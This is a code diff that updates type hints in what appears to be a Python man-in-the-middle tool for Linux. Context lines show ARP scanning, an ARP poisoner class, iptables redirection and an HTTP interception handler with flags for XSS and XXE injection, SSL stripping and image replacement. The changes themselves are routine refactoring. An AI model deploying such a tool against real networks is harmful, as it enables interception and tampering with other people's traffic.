@@ -22,7 +22,6 @@ No bettercap, mitmproxy, arpspoof, or other external binaries.
 OS requirement: Linux only (iptables, /proc/sys/net/ipv4/ip_forward, AF_PACKET)
 Version: 1.0.0
 """
-from __future__ import annotations
 
 import gzip
 import logging
@@ -84,7 +83,7 @@ _IMG_ALT = '<img src="/wxf_banner" alt="[WXF intercepted]" style="max-width:100%
 # ARP helpers (pure Scapy)
 # ---------------------------------------------------------------------------
 
-def _get_iface_info(iface: str) -> Tuple[str, str, str]:
+def _get_iface_info(iface: str) -> tuple[str, str, str]:
     """Return (ip, mac, netmask_cidr) for the given interface."""
     from scapy.all import get_if_addr, get_if_hwaddr
     ip  = get_if_addr(iface)
@@ -104,7 +103,7 @@ def _get_iface_info(iface: str) -> Tuple[str, str, str]:
     return ip, mac, cidr
 
 
-def _get_default_gateway(iface: str) -> Tuple[str, str]:
+def _get_default_gateway(iface: str) -> tuple[str, str]:
     """Return (gw_ip, gw_mac) for the default gateway."""
     try:
         out = subprocess.check_output(
@@ -119,7 +118,7 @@ def _get_default_gateway(iface: str) -> Tuple[str, str]:
     return gw_ip, gw_mac or "ff:ff:ff:ff:ff:ff"
 
 
-def _arp_who_has(ip: str, iface: str, timeout: float = 2.0) -> Optional[str]:
+def _arp_who_has(ip: str, iface: str, timeout: float = 2.0) -> str | None:
     """ARP request to resolve IP → MAC."""
     try:
         from scapy.all import ARP, Ether, srp
@@ -134,7 +133,7 @@ def _arp_who_has(ip: str, iface: str, timeout: float = 2.0) -> Optional[str]:
     return None
 
 
-def _arp_scan(network: str, iface: str, timeout: float = 5.0) -> List[Tuple[str, str]]:
+def _arp_scan(network: str, iface: str, timeout: float = 5.0) -> list[tuple[str, str]]:
     """Scan subnet for live hosts. Returns [(ip, mac), ...]."""
     try:
         from scapy.all import ARP, Ether, srp
@@ -162,7 +161,7 @@ class ARPPoisoner:
         our_ip: str,
         gateway_ip: str,
         gateway_mac: str,
-        targets: List[Tuple[str, str]],  # [(ip, mac), ...]
+        targets: list[tuple[str, str]],  # [(ip, mac), ...]
         interval: float = 2.0,
     ) -> None:
         self._iface = iface
@@ -173,7 +172,7 @@ class ARPPoisoner:
         self._targets = targets
         self._interval = interval
         self._stop = threading.Event()
-        self._thread: Optional[threading.Thread] = None
+        self._thread: threading.Thread | None = None
 
     def start(self) -> None:
         self._stop.clear()
@@ -236,7 +235,7 @@ class ARPPoisoner:
 # iptables management
 # ---------------------------------------------------------------------------
 
-_IPTABLES_RULES: List[List[str]] = []
+_IPTABLES_RULES: list[list[str]] = []
 
 
 def _ipt(*args: str) -> None:
@@ -285,7 +284,7 @@ _INJECT_XSS: bool = True
 _INJECT_XXE: bool = True
 _REPLACE_IMAGES: bool = True
 _SSL_STRIP: bool = True
-_TARGETS_IPS: List[str] = []
+_TARGETS_IPS: list[str] = []
 _REQUEST_COUNT: int = 0
 _REQUEST_LOCK = threading.Lock()
 
@@ -428,7 +427,7 @@ class MITMHandler(BaseHTTPRequestHandler):
                     if not chunk:
                         break
                     resp_data += chunk
-                except socket.timeout:
+                except TimeoutError:
                     break
             conn.close()
 
@@ -450,7 +449,7 @@ class MITMHandler(BaseHTTPRequestHandler):
             status_line = resp_lines[0]
 
             # Decompress if needed
-            resp_headers_dict: Dict[str, str] = {}
+            resp_headers_dict: dict[str, str] = {}
             for line in resp_lines[1:]:
                 if ": " in line:
                     k, v = line.split(": ", 1)
